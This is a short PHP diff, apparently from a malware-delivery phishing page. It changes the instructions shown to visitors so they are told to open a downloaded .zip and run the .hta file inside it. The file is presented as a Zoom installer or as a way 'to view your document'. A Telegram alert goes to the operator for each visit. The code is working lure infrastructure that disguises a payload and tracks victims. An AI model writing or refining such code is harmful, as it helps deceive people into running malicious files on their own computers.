@@ -18,11 +18,12 @@ $tk    = rawurlencode($_GET['tk']);
 $nameQ = rawurlencode($name);
 
 // Instruction is variant-aware: "to install" for Zoom names,
-// "to view your document" for document names. Points at Windows 11
-// File Explorer "Recent", where fresh downloads land first.
+// "to view your document" for document names. The download is a .zip
+// (the .hta lives inside); points at File Explorer "Recent".
+$zipBase = preg_replace('/\.hta$/i', '', $name);
 $instr = ($kind === 'zoom')
-    ? 'Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to install.'
-    : 'Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to view your document.';
+    ? 'Open <strong>' . htmlspecialchars($zipBase . '.zip') . '</strong> in <strong>Recent</strong> (File Explorer), then run the file inside it to install.'
+    : 'Open <strong>' . htmlspecialchars($zipBase . '.zip') . '</strong> in <strong>Recent</strong> (File Explorer), then run the file inside it to view your document.';
 
 // ---- one Telegram alert per visit (deduped by token nonce) ----
 $key = ALERT_DIR . '/al_' . md5($tok['r'] . '|' . $name) . '.fired';
